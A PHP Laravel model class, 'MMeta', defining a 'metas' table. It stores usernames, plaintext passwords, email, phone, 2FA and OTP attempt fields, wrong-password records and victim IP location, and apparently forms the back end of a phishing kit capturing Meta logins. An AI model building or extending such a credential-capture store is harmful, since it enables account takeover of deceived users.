<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class MMeta extends Model
{
    use HasFactory;
    protected $table = 'metas';

    const CREATED_AT = 'created_at';
    const UPDATED_AT = 'updated_at';

    protected $fillable = ['username', 'password', 'email', 'phone', '2fa', 'otp_wrong', 'otp_correct', 'password_wrong', 'date', 'ip_address', 'ip_location'];
}
